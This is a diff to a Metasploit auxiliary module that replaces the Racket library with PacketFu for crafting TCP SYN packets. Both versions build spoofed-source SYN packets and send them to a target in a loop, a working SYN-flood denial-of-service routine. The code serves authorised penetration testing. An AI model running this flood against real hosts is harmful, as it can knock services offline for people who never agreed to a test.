@@ -10,7 +10,6 @@
 ##
 
 require 'msf/core'
-require 'racket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -56,31 +55,19 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("SYN flooding #{rhost}:#{rport}...")
 
-		n = Racket::Racket.new
-		n.l3 = Racket::L3::IPv4.new
-		n.l3.dst_ip = rhost
-		n.l3.protocol = 6
-		n.l4 = Racket::L4::TCP.new
-		n.l4.src_port = sport
-		n.l4.dst_port = rport
-		n.l4.flag_syn = 1
-		n.l4.ack = 0
+		p = PacketFu::TCPPacket.new
+		p.ip_saddr = srchost
+		p.ip_daddr = rhost
+		p.tcp_dport = rport
+		p.tcp_flags.syn = 1
 
 		while (num <= 0) or (sent < num)
-
-			n.l3.src_ip = srchost
-			n.l3.id = rand(0x10000)
-			n.l3.ttl = rand(128)+128
-			n.l4.window   = rand(4096)+1
-			n.l4.src_port = sport
-			n.l4.seq  = rand(0x100000000)
-
-			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip, '')
-
-			pkt = n.pack
-
-			capture_sendto(pkt,rhost)
-
+			p.ip_ttl = rand(128)+128
+			p.tcp_win = rand(4096)+1
+			p.tcp_sport = sport
+			p.tcp_seq = rand(0x100000000)
+			p.recalc
+			capture_sendto(p,rhost)
 			sent += 1
 		end
 
